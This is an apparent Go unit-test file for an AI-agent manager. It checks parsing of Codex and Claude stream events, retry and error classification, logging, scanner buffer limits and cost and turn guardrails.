package agent

import (
	"bytes"
	"context"
	"errors"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Automaat/sybra/internal/events"
	"github.com/Automaat/sybra/internal/limits"
	"github.com/Automaat/sybra/internal/provider"
)

// newParseTestManager returns a Manager suitable for unit-testing
// streamHeadlessOutput: discard logs, no emit, no log dir. The health gate
// and guardrails are left zero so no turn/cost limits fire.
func newParseTestManager(t *testing.T, cfgs ...ManagerConfig) *Manager {
	t.Helper()
	logger := slog.New(slog.DiscardHandler)
	emit := func(string, any) {}
	return mustNewManager(t, context.Background(), emit, logger, t.TempDir(), cfgs...)
}

// lastResult returns the last result event from the agent's output buffer,
// or nil if none.
func lastResult(a *Agent) *StreamEvent {
	out := a.Output()
	for i := range slices.Backward(out) {
		if out[i].Type == "result" {
			return &out[i]
		}
	}
	return nil
}

func TestParseCodexStreamEvent_AgentMessage(t *testing.T) {
	line := []byte(`{"type":"item.completed","item":{"id":"item_0","type":"agent_message","text":"hi"}}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	got := codexEventToStreamEvent(parsed)
	if got.Type != "assistant" {
		t.Fatalf("Type = %q, want assistant", got.Type)
	}
	if got.Content != "hi" {
		t.Fatalf("Content = %q, want hi", got.Content)
	}
}

func TestParseCodexStreamEvent_CommandExecution(t *testing.T) {
	started := []byte(`{"type":"item.started","item":{"id":"item_1","type":"command_execution","command":"pwd","aggregated_output":"","exit_code":null,"status":"in_progress"}}`)
	completed := []byte(`{"type":"item.completed","item":{"id":"item_1","type":"command_execution","command":"pwd","aggregated_output":"/repo\n","exit_code":0,"status":"completed"}}`)

	startParsed, err := ParseCodexLine(started)
	if err != nil {
		t.Fatalf("ParseCodexLine started: %v", err)
	}
	startEv := codexEventToStreamEvent(startParsed)
	if startEv.Type != "tool_use" || startEv.Content != "pwd" {
		t.Fatalf("started = %#v, want tool_use pwd", startEv)
	}

	doneParsed, err := ParseCodexLine(completed)
	if err != nil {
		t.Fatalf("ParseCodexLine completed: %v", err)
	}
	doneEv := codexEventToStreamEvent(doneParsed)
	if doneEv.Type != "tool_result" || doneEv.Content != "/repo\n" {
		t.Fatalf("completed = %#v, want tool_result output", doneEv)
	}
}

func TestParseCodexStreamEvent_TurnCompleted(t *testing.T) {
	line := []byte(`{"type":"turn.completed","usage":{"input_tokens":16012,"cached_input_tokens":2432,"output_tokens":18}}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	got := codexEventToStreamEvent(parsed)
	if got.Type != "result" {
		t.Fatalf("Type = %q, want result", got.Type)
	}
	if got.InputTokens != 16012 || got.OutputTokens != 18 {
		t.Fatalf("tokens = %d/%d, want 16012/18", got.InputTokens, got.OutputTokens)
	}
}

func TestProcessHeadlessLine_SuppressesCodexLimitSnapshotOutput(t *testing.T) {
	var snapshots []limits.Snapshot
	var emitted []any
	m := newParseTestManager(t, ManagerConfig{
		LimitSink: func(snapshot limits.Snapshot) {
			snapshots = append(snapshots, snapshot)
		},
	})
	m.emit = func(event string, data any) {
		if event == events.AgentOutput("limit1") {
			emitted = append(emitted, data)
		}
	}
	a := &Agent{ID: "limit1", TaskID: "t", Mode: "headless", Provider: "codex", StartedAt: time.Now().UTC()}
	lastEmit := time.Now().Add(-time.Minute)
	line := []byte(`{"timestamp":"2026-06-19T12:40:08.052Z","type":"event_msg","payload":{"type":"token_count","info":{"last_token_usage":{"input_tokens":1,"output_tokens":1,"total_tokens":2}},"rate_limits":{"limit_id":"codex","primary":{"used_percent":12,"window_minutes":300,"resets_at":1781877547},"plan_type":"pro"}}}`)

	if stop := m.processHeadlessLine(context.Background(), a, line, &lastEmit, providerByName("codex")); stop {
		t.Fatal("limit snapshot event must not stop the stream")
	}
	if len(snapshots) != 1 {
		t.Fatalf("limit snapshots = %d, want 1", len(snapshots))
	}
	if snapshots[0].Provider != limits.ProviderCodex {
		t.Fatalf("snapshot provider = %q, want codex", snapshots[0].Provider)
	}
	if out := a.Output(); len(out) != 0 {
		t.Fatalf("agent output = %+v, want no rendered usage event", out)
	}
	if len(emitted) != 0 {
		t.Fatalf("emitted output events = %d, want none", len(emitted))
	}
}

// TestProcessHeadlessLine_ResultLogOmitsSessionCostForCodex verifies that
// agent.headless.result drops the meaningless session_id/cost fields for
// codex (which never reports them), while keeping them for providers that
// do (e.g. claude) — see #1560.
func TestProcessHeadlessLine_ResultLogOmitsSessionCostForCodex(t *testing.T) {
	var logBuf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&logBuf, nil))
	m := mustNewManager(t, context.Background(), func(string, any) {}, logger, t.TempDir())

	a := &Agent{ID: "codex1", TaskID: "t", Mode: "headless", Provider: "codex", StartedAt: time.Now().UTC()}
	lastEmit := time.Now().Add(-time.Minute)
	line := []byte(`{"type":"turn.completed","usage":{"input_tokens":123,"output_tokens":45}}`)
	if stop := m.processHeadlessLine(context.Background(), a, line, &lastEmit, providerByName("codex")); stop {
		t.Fatal("result event must not stop the stream")
	}

	logged := logBuf.String()
	if !strings.Contains(logged, "agent.headless.result") {
		t.Fatalf("log = %q, want agent.headless.result entry", logged)
	}
	if strings.Contains(logged, "session_id=") || strings.Contains(logged, "cost=") {
		t.Fatalf("log = %q, want no session_id/cost fields for codex", logged)
	}
	if !strings.Contains(logged, "input_tokens=123") || !strings.Contains(logged, "output_tokens=45") {
		t.Fatalf("log = %q, want input_tokens/output_tokens present", logged)
	}

	logBuf.Reset()
	b := &Agent{ID: "claude1", TaskID: "t", Mode: "headless", Provider: "claude", StartedAt: time.Now().UTC()}
	claudeLine := []byte(`{"type":"result","subtype":"success","session_id":"sess-1","total_cost_usd":0.25,"usage":{"input_tokens":10,"output_tokens":5}}`)
	if stop := m.processHeadlessLine(context.Background(), b, claudeLine, &lastEmit, providerByName("claude")); stop {
		t.Fatal("result event must not stop the stream")
	}
	claudeLogged := logBuf.String()
	if !strings.Contains(claudeLogged, `session_id=sess-1`) {
		t.Fatalf("log = %q, want session_id present for claude", claudeLogged)
	}
	if !strings.Contains(claudeLogged, "cost=0.25") {
		t.Fatalf("log = %q, want cost present for claude", claudeLogged)
	}
}

func TestParseCodexStreamEvent_Error_SubstringFallback(t *testing.T) {
	line := []byte(`{"type":"error","message":"Service overloaded (529)"}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	if parsed.Type != "result" || parsed.Subtype != "error" {
		t.Fatalf("got type=%q subtype=%q, want result/error", parsed.Type, parsed.Subtype)
	}
	got := codexEventToStreamEvent(parsed)
	if got.Type != "result" || got.Subtype != "error" {
		t.Fatalf("StreamEvent type=%q subtype=%q, want result/error", got.Type, got.Subtype)
	}

	if !shouldRetry("", []StreamEvent{got}, nil) {
		t.Fatal("shouldRetry = false, want true (substring fallback on overloaded message)")
	}
}

func TestParseCodexStreamEvent_Error_StructuredCode(t *testing.T) {
	line := []byte(`{"type":"error","message":"Service overloaded","code":529}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	if parsed.Result == nil {
		t.Fatal("Result is nil")
	}
	if parsed.Result.ErrorStatus != 529 {
		t.Fatalf("ErrorStatus = %d, want 529", parsed.Result.ErrorStatus)
	}

	got := codexEventToStreamEvent(parsed)
	if got.ErrorStatus != 529 {
		t.Fatalf("StreamEvent.ErrorStatus = %d, want 529", got.ErrorStatus)
	}
	if !shouldRetry("", []StreamEvent{got}, nil) {
		t.Fatal("shouldRetry = false, want true (structured ErrorStatus=529)")
	}
}

func TestParseCodexStreamEvent_Error_StructuredErrorType(t *testing.T) {
	line := []byte(`{"type":"error","message":"Overloaded","error_type":"overloaded_error","code":529}`)

	parsed, err := ParseCodexLine(line)
	if err != nil {
		t.Fatalf("ParseCodexLine: %v", err)
	}
	if parsed.Result == nil {
		t.Fatal("Result is nil")
	}
	if parsed.Result.ErrorType != "overloaded_error" {
		t.Fatalf("ErrorType = %q, want overloaded_error", parsed.Result.ErrorType)
	}

	got := codexEventToStreamEvent(parsed)
	if got.ErrorType != "overloaded_error" {
		t.Fatalf("StreamEvent.ErrorType = %q, want overloaded_error", got.ErrorType)
	}
	if !shouldRetry("", []StreamEvent{got}, nil) {
		t.Fatal("shouldRetry = false, want true (structured ErrorType=overloaded_error)")
	}
}

func TestShouldRetry_ResultErrorWithoutSubtype(t *testing.T) {
	streamEvents := []StreamEvent{{
		Type:        "result",
		Content:     "Overloaded",
		ErrorType:   "overloaded_error",
		ErrorStatus: 529,
	}}
	if !shouldRetry("", streamEvents, nil) {
		t.Fatal("shouldRetry = false, want true for structured overloaded result without subtype")
	}
}

func TestShouldRetry_ResultErrorDuringExecutionSubtype(t *testing.T) {
	streamEvents := []StreamEvent{{
		Type:    "result",
		Subtype: "error_during_execution",
		Content: "API Error: 529 overloaded",
	}}
	if !shouldRetry("", streamEvents, nil) {
		t.Fatal("shouldRetry = false, want true for 529 in error_during_execution result")
	}
}

func TestShouldRetry_Stderr529(t *testing.T) {
	if !shouldRetry("error: 529 overloaded", nil, nil) {
		t.Fatal("shouldRetry = false on stderr containing 529")
	}
}

func TestShouldRetry_FatalError_NoRetry(t *testing.T) {
	streamEvents := []StreamEvent{{Type: "result", Subtype: "error", Content: "permission denied"}}
	if shouldRetry("", streamEvents, nil) {
		t.Fatal("shouldRetry = true on non-transient error, want false")
	}
}

func TestLogAttemptStderr_CleanExit_LogsDebugNotError(t *testing.T) {
	var buf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&buf, &slog.HandlerOptions{Level: slog.LevelDebug}))

	logAttemptStderr(logger, "agent.headless.stderr", "agent-1", "Reading additional input from stdin...", nil)

	out := buf.String()
	if strings.Contains(out, "level=ERROR") {
		t.Fatalf("expected no ERROR log on clean exit, got: %s", out)
	}
	if !strings.Contains(out, "level=DEBUG") || !strings.Contains(out, "Reading additional input from stdin...") {
		t.Fatalf("expected DEBUG log with stderr content, got: %s", out)
	}
}

func TestLogAttemptStderr_FinalProviderFailure_LogsError(t *testing.T) {
	var buf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&buf, &slog.HandlerOptions{Level: slog.LevelDebug}))

	logAttemptStderr(logger, "agent.headless.stderr", "agent-1", "You've hit your weekly limit", errProviderRateLimited)

	out := buf.String()
	if !strings.Contains(out, "level=ERROR") || !strings.Contains(out, "You've hit your weekly limit") {
		t.Fatalf("expected ERROR log with stderr content on final provider failure, got: %s", out)
	}
}

func TestLogAttemptStderr_ConvoPreservesExtraFields(t *testing.T) {
	var buf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&buf, &slog.HandlerOptions{Level: slog.LevelDebug}))

	logAttemptStderr(logger, "agent.convo.stderr", "agent-1", "Reading additional input from stdin...", nil, "provider", "codex")

	out := buf.String()
	if !strings.Contains(out, "level=DEBUG") || !strings.Contains(out, "provider=codex") {
		t.Fatalf("expected DEBUG convo log with provider field, got: %s", out)
	}
}

func TestLogAttemptStderr_EmptyStderr_NoLog(t *testing.T) {
	var buf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&buf, &slog.HandlerOptions{Level: slog.LevelDebug}))

	logAttemptStderr(logger, "agent.headless.stderr", "agent-1", "", nil)

	if buf.Len() != 0 {
		t.Fatalf("expected no log for empty stderr, got: %s", buf.String())
	}
}

// TestClassifyProviderError_CodexConnectivityRoutesToRateLimit pins the
// acceptance path: a codex backend connectivity error must classify as
// SignalRateLimit and map to ErrorKind "rate_limit" (not "" / a fatal kind),
// since signalErrorKind's return value is what the completion handler keys
// off to failover/park instead of escalating to human-required.
func TestClassifyProviderError_CodexConnectivityRoutesToRateLimit(t *testing.T) {
	sample := provider.ErrorSample{
		Stderr: "websocket connection refused: wss://chatgpt.com/backend-api/codex/responses",
	}
	sig, reason, _ := classifyProviderError("codex", sample)
	if sig != provider.SignalRateLimit {
		t.Fatalf("signal = %v, want SignalRateLimit", sig)
	}
	if reason != "connectivity" {
		t.Fatalf("reason = %q, want connectivity", reason)
	}
	if got := signalErrorKind(sig); got != "rate_limit" {
		t.Fatalf("signalErrorKind = %q, want rate_limit", got)
	}
}

func TestResultStreamError(t *testing.T) {
	t.Parallel()

	err := resultStreamError([]StreamEvent{
		{Type: "assistant", Content: "working"},
		{Type: "result", Content: "You've hit your weekly limit", ErrorType: "rate_limit", ErrorStatus: 429},
	})
	if err == nil {
		t.Fatal("resultStreamError = nil, want error")
	}
	if got := err.Error(); got != "provider result error rate_limit (429)" {
		t.Fatalf("error = %q, want provider result error rate_limit (429)", got)
	}

	if err := resultStreamError([]StreamEvent{{Type: "result", Content: "ok"}}); err != nil {
		t.Fatalf("resultStreamError(success) = %v, want nil", err)
	}

	err = resultStreamError([]StreamEvent{{Type: "result", Subtype: "error", Content: "You've hit your weekly limit"}})
	if err == nil {
		t.Fatal("resultStreamError(subtype error) = nil, want error")
	}

	err = resultStreamError([]StreamEvent{{Type: "result", Subtype: "error_during_execution", Content: "No conversation found"}})
	if err == nil {
		t.Fatal("resultStreamError(error_during_execution) = nil, want error")
	}
}

func TestLastHeadlessResultMarksStructuredError(t *testing.T) {
	a := &Agent{}
	a.AppendOutput(StreamEvent{Type: "result", Content: "You've hit your weekly limit", ErrorType: "rate_limit", ErrorStatus: 429})

	found, isError := a.lastHeadlessResult()
	if !found {
		t.Fatal("lastHeadlessResult found = false, want true")
	}
	if !isError {
		t.Fatal("lastHeadlessResult isError = false, want true")
	}
}

func TestLastHeadlessResultMarksErrorSubtype(t *testing.T) {
	a := &Agent{}
	a.AppendOutput(StreamEvent{Type: "result", Subtype: "error_during_execution", Content: "No conversation found"})

	found, isError := a.lastHeadlessResult()
	if !found {
		t.Fatal("lastHeadlessResult found = false, want true")
	}
	if !isError {
		t.Fatal("lastHeadlessResult isError = false, want true")
	}
}

func TestCompletedSuccessfully(t *testing.T) {
	t.Run("success result", func(t *testing.T) {
		a := &Agent{}
		a.AppendOutput(StreamEvent{Type: "assistant", Content: "working"})
		a.AppendOutput(StreamEvent{Type: "result", Content: "done"})
		if !a.CompletedSuccessfully() {
			t.Fatal("CompletedSuccessfully = false on clean terminal result, want true")
		}
	})
	t.Run("error result", func(t *testing.T) {
		a := &Agent{}
		a.AppendOutput(StreamEvent{Type: "result", Subtype: "error_during_execution"})
		if a.CompletedSuccessfully() {
			t.Fatal("CompletedSuccessfully = true on error result, want false")
		}
	})
	t.Run("not terminated on result", func(t *testing.T) {
		a := &Agent{}
		a.AppendOutput(StreamEvent{Type: "result", Content: "done"})
		a.AppendOutput(StreamEvent{Type: "assistant", Content: "still going"})
		if a.CompletedSuccessfully() {
			t.Fatal("CompletedSuccessfully = true when result is not the last event, want false")
		}
	})
}

func TestTerminalResultIdle(t *testing.T) {
	t.Run("idle past grace after clean result", func(t *testing.T) {
		a := &Agent{}
		a.AppendOutput(StreamEvent{Type: "result", Content: "done"})
		a.mu.Lock()
		a.LastEventAt = time.Now().Add(-2 * time.Minute)
		a.mu.Unlock()
		if !a.TerminalResultIdle(90 * time.Second) {
			t.Fatal("TerminalResultIdle = false on result idle past grace, want true")
		}
	})
	t.Run("within grace", func(t *testing.T) {
		a := &Agent{}
		a.AppendOutput(StreamEvent{Type: "result", Content: "done"})
		a.TouchLastEvent()
		if a.TerminalResultIdle(90 * time.Second) {
			t.Fatal("TerminalResultIdle = true within grace, want false")
		}
	})
	t.Run("error result never idles out", func(t *testing.T) {
		a := &Agent{}
		a.AppendOutput(StreamEvent{Type: "result", Subtype: "error_during_execution"})
		a.mu.Lock()
		a.LastEventAt = time.Now().Add(-2 * time.Minute)
		a.mu.Unlock()
		if a.TerminalResultIdle(90 * time.Second) {
			t.Fatal("TerminalResultIdle = true on error result, want false")
		}
	})
	t.Run("non-result last event", func(t *testing.T) {
		a := &Agent{}
		a.AppendOutput(StreamEvent{Type: "result", Content: "done"})
		a.AppendOutput(StreamEvent{Type: "assistant", Content: "long bash running"})
		a.mu.Lock()
		a.LastEventAt = time.Now().Add(-2 * time.Minute)
		a.mu.Unlock()
		if a.TerminalResultIdle(90 * time.Second) {
			t.Fatal("TerminalResultIdle = true when last event is not a result, want false")
		}
	})
	t.Run("codex turn.completed idle past grace", func(t *testing.T) {
		// Codex never emits a "result"-typed line; its terminal signal is
		// turn.completed, mapped to StreamEvent{Type: "result"} by
		// codexEventToStreamEvent. This locks in that the shared postResultGrace
		// reaper reaps a lingering codex process the same way it does claude.
		a := &Agent{}
		parsed, err := ParseCodexLine([]byte(`{"type":"turn.completed","usage":{"input_tokens":100,"output_tokens":10}}`))
		if err != nil {
			t.Fatalf("ParseCodexLine: %v", err)
		}
		a.AppendOutput(codexEventToStreamEvent(parsed))
		a.mu.Lock()
		a.LastEventAt = time.Now().Add(-2 * time.Minute)
		a.mu.Unlock()
		if !a.TerminalResultIdle(90 * time.Second) {
			t.Fatal("TerminalResultIdle = false on codex turn.completed idle past grace, want true")
		}
	})
}

// TestFinalizeFromResult_IgnoresKillSignalWaitErr covers the fix for the
// non-detached (survive_restart: false) headless path: when the watchdog's
// checkCompletedHang kills a process that already emitted a clean terminal
// result, cmd.Wait() surfaces the kill as a non-nil error. finalizeFromResult
// must derive completion from the result event, not that wait error, so the
// run finalizes as a success instead of the workflow engine treating it as a
// stopped/failed stall.
func TestFinalizeFromResult_IgnoresKillSignalWaitErr(t *testing.T) {
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), func(string, any) {}, logger, t.TempDir())

	a := &Agent{}
	a.AppendOutput(StreamEvent{Type: "assistant", Content: "working"})
	a.AppendOutput(StreamEvent{Type: "result", Content: "done"})
	// Simulate what runHeadlessAttemptPipe used to do unconditionally: record
	// the kill signal from cmd.Wait() as the exit error.
	a.SetExitErr(errors.New("signal: killed"))

	m.finalizeFromResult(a, 0)

	if err := a.GetExitErr(); err != nil {
		t.Fatalf("GetExitErr() = %v, want nil (finalized from clean result)", err)
	}
}

func TestLastHeadlessResultIgnoresPriorRetryResult(t *testing.T) {
	a := &Agent{}
	a.AppendOutput(StreamEvent{Type: "result", Content: "overloaded", ErrorType: "overloaded_error", ErrorStatus: 529})
	a.AppendOutput(StreamEvent{Type: "system", Content: "new attempt"})

	found, isError := a.lastHeadlessResult()
	if found || isError {
		t.Fatalf("lastHeadlessResult = (%v, %v), want no terminal result", found, isError)
	}
}

// TestStreamHeadlessOutput_MalformedMidStream verifies that a malformed
// NDJSON line between two valid events is logged but does NOT break the
// stream — subsequent valid events must still be parsed. A regression that
// aborts the scanner on parse error would drop everything after the bad line.
func TestStreamHeadlessOutput_MalformedMidStream(t *testing.T) {
	input := strings.Join([]string{
		`{"type":"assistant","message":{"content":[{"type":"text","text":"before"}]}}`,
		`{garbled not json`,
		`{"type":"result","result":"done","session_id":"s1","total_cost_usd":0.10,"total_input_tokens":10,"total_output_tokens":5}`,
	}, "\n") + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	out := a.Output()
	if len(out) != 2 {
		t.Fatalf("got %d events, want 2 (malformed line must be logged, not abort the stream). events=%+v", len(out), out)
	}
	if out[0].Type != "assistant" || !strings.Contains(out[0].Content, "before") {
		t.Errorf("first event = %+v, want assistant with 'before' content", out[0])
	}
	if out[1].Type != "result" || out[1].Content != "done" {
		t.Errorf("last event = %+v, want result 'done'", out[1])
	}
}

// TestStreamHeadlessOutput_LargeResultContent verifies a near-buffer-limit
// result event is parsed successfully. The scanner buffer is 1 MiB so a
// result with a 512 KiB content field is well within bounds.
func TestStreamHeadlessOutput_LargeResultContent(t *testing.T) {
	const contentSize = 512 * 1024
	big := strings.Repeat("a", contentSize)
	input := `{"type":"result","result":"` + big + `","session_id":"s1","total_cost_usd":0.01,"total_input_tokens":1,"total_output_tokens":1}` + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	r := lastResult(a)
	if r == nil {
		t.Fatal("no result event captured")
		return
	}
	if len(r.Content) != contentSize {
		t.Errorf("result content len = %d, want %d (buffer should accept up to 1 MiB)", len(r.Content), contentSize)
	}
}

// TestStreamHeadlessOutput_OversizedLineLogsError exercises the 4 MiB
// scanner cap. A line larger than the buffer makes bufio.Scanner.Scan()
// return false with ErrTooLong; the surrounding loop then logs the error
// via m.logger so operators can diagnose mysterious "agent stopped with no
// result" events. Prior to the fix the scanner error was silently
// swallowed — this test pins that the error now surfaces in logs.
func TestStreamHeadlessOutput_OversizedLineLogsError(t *testing.T) {
	// 5 MiB exceeds the 4 MiB scanner buffer.
	huge := strings.Repeat("x", 5*1024*1024)
	input := `{"type":"result","result":"` + huge + `","session_id":"s1","total_cost_usd":0.01}` + "\n"
	// Trailing valid event is still dropped — ErrTooLong aborts the scanner.
	input += `{"type":"assistant","message":{"content":[{"type":"text","text":"after"}]}}` + "\n"

	var logBuf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))
	m := mustNewManager(t, context.Background(), func(string, any) {}, logger, t.TempDir())

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	if got := len(a.Output()); got != 0 {
		t.Errorf("got %d events; want 0 — oversized line should abort scanner", got)
	}
	logs := logBuf.String()
	if !strings.Contains(logs, "stream.error") {
		t.Errorf("expected scanner error to be logged via agent.headless.stream.error; got logs:\n%s", logs)
	}
}

// TestStreamHeadlessOutput_LargeLineUnderBufferCap verifies the new 4 MiB
// cap parses successfully where the old 1 MiB cap would have choked. An
// Opus response with a large dumped command output (~2 MiB content field)
// now round-trips without scanner error.
func TestStreamHeadlessOutput_LargeLineUnderBufferCap(t *testing.T) {
	const contentSize = 2 * 1024 * 1024 // within the 4 MiB buffer
	big := strings.Repeat("a", contentSize)
	input := `{"type":"result","result":"` + big + `","session_id":"s1","total_cost_usd":0.01,"total_input_tokens":1,"total_output_tokens":1}` + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	r := lastResult(a)
	if r == nil {
		t.Fatal("no result event captured for 2 MiB line")
		return
	}
	if len(r.Content) != contentSize {
		t.Errorf("content len = %d, want %d (2 MiB should fit in the 4 MiB buffer)", len(r.Content), contentSize)
	}
}

// TestStreamHeadlessOutput_BOMOnFirstLine verifies behavior when the
// provider outputs a UTF-8 BOM before the first NDJSON event. Go's
// json.Unmarshal does not tolerate BOM, so the first event is dropped as a
// parse error; subsequent events must still be parsed cleanly.
func TestStreamHeadlessOutput_BOMOnFirstLine(t *testing.T) {
	bom := "\xef\xbb\xbf"
	input := bom + `{"type":"assistant","message":{"content":[{"type":"text","text":"first"}]}}` + "\n" +
		`{"type":"result","result":"ok","session_id":"s1","total_cost_usd":0.01}` + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	out := a.Output()
	if len(out) != 1 {
		t.Fatalf("got %d events, want 1 (BOM-prefixed line should be dropped, subsequent valid line parsed). events=%+v", len(out), out)
	}
	if out[0].Type != "result" {
		t.Errorf("surviving event = %+v, want result", out[0])
	}
}

// TestStreamHeadlessOutput_PartialLineAtEOF verifies that an incomplete
// JSON payload on the last line (no closing brace) is handled: the scanner
// returns the partial content as one final token, json.Unmarshal fails, and
// the event is dropped without aborting the stream or crashing.
func TestStreamHeadlessOutput_PartialLineAtEOF(t *testing.T) {
	input := `{"type":"assistant","message":{"content":[{"type":"text","text":"ok"}]}}` + "\n" +
		`{"type":"result","result":"incomplete`
	// Note: no closing brace, no newline.

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	out := a.Output()
	if len(out) != 1 {
		t.Fatalf("got %d events, want 1 (partial final line must be dropped, not crash). events=%+v", len(out), out)
	}
	if out[0].Type != "assistant" {
		t.Errorf("surviving event = %+v, want assistant", out[0])
	}
}

// TestStreamHeadlessOutput_MultipleResultEvents pins the current semantics
// when a provider emits more than one "result" event in a single stream,
// each under a distinct session id. Both events are recorded in the output
// buffer; the second session's final cumulative cost is banked on top of the
// first session's (genuinely separate spend, so it adds); session_id takes
// the last non-empty value. Callers downstream that pick the "final" result
// via backward scan thus see the last one.
func TestStreamHeadlessOutput_MultipleResultEvents(t *testing.T) {
	input := `{"type":"result","result":"first","session_id":"s1","total_cost_usd":0.10,"total_input_tokens":10,"total_output_tokens":5}` + "\n" +
		`{"type":"result","result":"second","session_id":"s2","total_cost_usd":0.20,"total_input_tokens":20,"total_output_tokens":10}` + "\n"

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	out := a.Output()
	if len(out) != 2 {
		t.Fatalf("got %d result events, want 2 (both must be recorded). events=%+v", len(out), out)
	}
	if got := a.GetCostUSD(); got < 0.29 || got > 0.31 {
		t.Errorf("GetCostUSD = %f, want ~0.30 (session s1's final cost banked, plus session s2's final cost)", got)
	}
	if got := a.GetSessionID(); got != "s2" {
		t.Errorf("GetSessionID = %q, want %q (last non-empty wins)", got, "s2")
	}
	if last := lastResult(a); last == nil || last.Content != "second" {
		t.Errorf("last result content = %+v, want 'second' (backward scan picks final)", last)
	}
}

// TestStreamHeadlessOutput_ContextCancelReturns verifies that when a provider
// subprocess hangs (reader never returns EOF), cancelling the parent context
// causes streamHeadlessOutput to return promptly instead of blocking forever.
// bufio.Scanner does not natively watch context — the cancellation must
// propagate via the child process dying; in unit-test form we use io.Pipe
// where the writer side can be closed on cancel to simulate the same effect.
// A regression that forgot to link ctx to an abort mechanism would hang the
// test. The 3-second deadline catches that.
func TestStreamHeadlessOutput_ContextCancelReturns(t *testing.T) {
	pipeR, pipeW := io.Pipe()
	// Seed one valid line so the scanner is mid-stream when we cancel.
	go func() {
		_, _ = io.WriteString(pipeW, `{"type":"assistant","message":{"content":[{"type":"text","text":"first"}]}}`+"\n")
		// Never write again, never close — simulate a stalled subprocess.
	}()

	m := newParseTestManager(t)
	a := &Agent{ID: "t", Provider: "claude"}

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		m.streamHeadlessOutput(ctx, a, pipeR, nil)
		close(done)
	}()

	// Wait until the reader has actually consumed the first line, instead of
	// guessing how long that takes.
	if !pollUntil(2*time.Second, time.Millisecond, func() bool {
		return len(a.Output()) >= 1
	}) {
		t.Error("stream never recorded the first event before cancellation")
	}
	cancel()
	// Closing the writer is what actually unblocks bufio.Scanner — this is
	// the same effect as the subprocess dying after ctx cancel propagates.
	_ = pipeW.Close()

	select {
	case <-done:
		// Good. Stream loop exited within the deadline.
	case <-time.After(3 * time.Second):
		t.Fatal("streamHeadlessOutput did not return within 3s of ctx cancel + reader close; the loop is not wired for cancellation")
	}

	// The single pre-cancel event must have been captured.
	if n := len(a.Output()); n < 1 {
		t.Errorf("expected the pre-cancel event to be recorded, got %d events", n)
	}
}

// TestGuardrails_MaxCostZeroMeansUnlimited pins the zero-as-unlimited
// semantics for MaxCostUSD. Guardrail checks use `maxCost > 0` as the gate;
// a regression that flipped this to `maxCost >= 0` would fire an escalation
// on every result event when the user hasn't set a cost limit — a noisy UX
// break. The test sets MaxCostUSD=0, produces a result with a large cost,
// and verifies NO escalation event is emitted.
func TestGuardrails_MaxCostZeroMeansUnlimited(t *testing.T) {
	input := `{"type":"result","result":"done","session_id":"s1","total_cost_usd":999.99,"total_input_tokens":1,"total_output_tokens":1}` + "\n"

	var escalations int
	var mu sync.Mutex
	emit := func(event string, _ any) {
		if strings.Contains(event, "agent:escalation:") {
			mu.Lock()
			escalations++
			mu.Unlock()
		}
	}
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), emit, logger, t.TempDir())
	m.SetGuardrails(Guardrails{MaxCostUSD: 0, MaxTurns: 0})

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	if escalations != 0 {
		t.Errorf("MaxCostUSD=0 should mean unlimited; got %d escalation events", escalations)
	}
}

// TestGuardrails_MaxTurnsZeroMeansUnlimited pins the zero-as-unlimited
// semantics for MaxTurns. The test streams many assistant events with
// MaxTurns=0 and verifies no turns escalation fires. With MaxTurns=0 the
// guardrail block is skipped entirely, so we don't need to wire the
// (nil-by-construction) escalation channel.
func TestGuardrails_MaxTurnsZeroMeansUnlimited(t *testing.T) {
	var lines []string
	for range 20 {
		lines = append(lines, `{"type":"assistant","message":{"content":[{"type":"text","text":"tick"}]}}`)
	}
	input := strings.Join(lines, "\n") + "\n"

	var escalations int
	var mu sync.Mutex
	emit := func(event string, _ any) {
		if strings.Contains(event, "agent:escalation:") {
			mu.Lock()
			escalations++
			mu.Unlock()
		}
	}
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), emit, logger, t.TempDir())
	m.SetGuardrails(Guardrails{MaxTurns: 0})

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	if escalations != 0 {
		t.Errorf("MaxTurns=0 should mean unlimited; got %d escalation events after 20 assistant events", escalations)
	}
